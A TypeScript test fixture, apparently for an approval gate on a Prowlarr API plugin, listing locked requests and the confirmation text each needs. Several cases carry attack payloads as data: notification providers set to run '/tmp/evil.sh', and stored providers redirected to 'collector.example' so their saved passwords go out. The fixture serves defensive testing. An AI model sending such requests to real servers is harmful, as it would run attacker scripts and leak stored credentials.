import { INSTANCE } from './fake-prowlarr.js';

/** One call per locked key (every key plugin.yaml locks by name, every split twin, and a sample of the bulk deletes
 * the bulk delete pattern locks), and the literal an approver must type for it against the fake Prowlarr. */
export interface LockCase {
  key: string;
  request: { method: string; path: string; body?: unknown; query?: Record<string, unknown> };
  confirm: string;
}

/** Secrets the lock-case bodies carry; no approval text may show them. */
export const BODY_SECRETS = ['sab-key-777777', 'idx-key-888888', 'secret-hook-999999', 'radarr-key-131313'];

const BACKUP = 'prowlarr_backup_v2.6.5.5623_2026.10.15_10.00.00.zip';
const field = (name: string, value: unknown, privacy = 'normal') => ({ name, value, privacy });
const provider = (name: string, implementation: string, fields: unknown[], id?: number) => ({
  ...(id ? { id } : {}),
  name,
  implementation,
  enable: true,
  fields,
});
const EVIL = [
  field('host', 'collector.example'),
  field('port', 443),
  field('useSsl', true),
  field('password', '********', 'password'),
];

export const LOCK_CASES: LockCase[] = [
  {
    key: 'PUT /api/v1/config/host/{id}',
    request: { method: 'PUT', path: '/api/v1/config/host/1', body: { id: 1, bindAddress: '*', urlBase: '/prowlarr' } },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v1/system/shutdown',
    request: { method: 'POST', path: '/api/v1/system/shutdown' },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v1/system/restart',
    request: { method: 'POST', path: '/api/v1/system/restart' },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v1/system/backup/restore/{id}',
    request: { method: 'POST', path: '/api/v1/system/backup/restore/21' },
    confirm: BACKUP,
  },
  {
    key: 'PUT /api/v1/indexer/bulk',
    request: { method: 'PUT', path: '/api/v1/indexer/bulk', body: { ids: [1, 2], tags: [12], applyTags: 'add' } },
    confirm: '2 indexers',
  },
  {
    key: 'PUT /api/v1/applications/bulk',
    request: { method: 'PUT', path: '/api/v1/applications/bulk', body: { ids: [4], syncLevel: 'fullSync' } },
    confirm: '1 application',
  },
  {
    key: 'POST /api/v1/applications/testall',
    request: { method: 'POST', path: '/api/v1/applications/testall' },
    confirm: INSTANCE,
  },
  {
    key: 'PUT /api/v1/config/development/{id}',
    request: {
      method: 'PUT',
      path: '/api/v1/config/development/1',
      body: { id: 1, logIndexerResponse: true, logSql: true },
    },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v1/command#heavy',
    request: { method: 'POST', path: '/api/v1/command', body: { name: 'ApplicationIndexerSync', forceSync: true } },
    confirm: 'ApplicationIndexerSync',
  },
  {
    key: 'POST /api/v1/notification#script',
    request: {
      method: 'POST',
      path: '/api/v1/notification',
      body: provider('Run it', 'CustomScript', [field('path', '/tmp/evil.sh')]),
    },
    confirm: 'Run it',
  },
  {
    key: 'PUT /api/v1/notification/{id}#script',
    request: {
      method: 'PUT',
      path: '/api/v1/notification/9',
      body: provider('Renamed', 'CustomScript', [field('path', '/tmp/evil.sh')], 9),
    },
    confirm: 'Discord',
  },
  {
    key: 'POST /api/v1/notification/test#script',
    request: {
      method: 'POST',
      path: '/api/v1/notification/test',
      body: provider('New', 'Webhook', [field('url', 'https://h.example'), field('scriptPath', '/tmp/evil.sh')]),
    },
    confirm: 'New',
  },
  {
    key: 'POST /api/v1/notification/testall#script',
    request: { method: 'POST', path: '/api/v1/notification/testall' },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v1/notification/action/{name}#script',
    request: {
      method: 'POST',
      path: '/api/v1/notification/action/getDevices',
      body: provider('Discord', 'CustomScript', [field('path', '/tmp/evil.sh')], 9),
    },
    confirm: 'Discord',
  },
  ...(['downloadclient', 'indexer', 'indexerproxy', 'applications', 'notification'] as const).flatMap((resource) => {
    const [id, name, implementation] = {
      downloadclient: [6, 'qBit', 'QBittorrent'],
      indexer: [2, 'PrivateHD', 'Cardigann'],
      indexerproxy: [10, 'Socks', 'Socks5'],
      applications: [4, 'Sonarr', 'Sonarr'],
      notification: [9, 'Discord', 'Discord'],
    }[resource] as [number, string, string];
    // The stored provider's own type, sent to a different host with its stored password.
    const body = provider(name, implementation, EVIL, id);
    return [
      {
        key: `POST /api/v1/${resource}/test#stored`,
        request: { method: 'POST', path: `/api/v1/${resource}/test`, body },
        confirm: name,
      },
      {
        key: `POST /api/v1/${resource}/action/{name}#stored`,
        request: { method: 'POST', path: `/api/v1/${resource}/action/getCategories`, body },
        confirm: name,
      },
    ];
  }),
  {
    key: 'DELETE /api/v1/indexer/bulk',
    request: { method: 'DELETE', path: '/api/v1/indexer/bulk', body: { ids: [1, 2] } },
    confirm: '2 indexers',
  },
  {
    key: 'DELETE /api/v1/applications/bulk',
    request: { method: 'DELETE', path: '/api/v1/applications/bulk', body: { ids: [4] } },
    confirm: '1 application',
  },
  {
    key: 'DELETE /api/v1/downloadclient/bulk',
    request: { method: 'DELETE', path: '/api/v1/downloadclient/bulk', body: { ids: [6] } },
    confirm: '1 download client',
  },
];
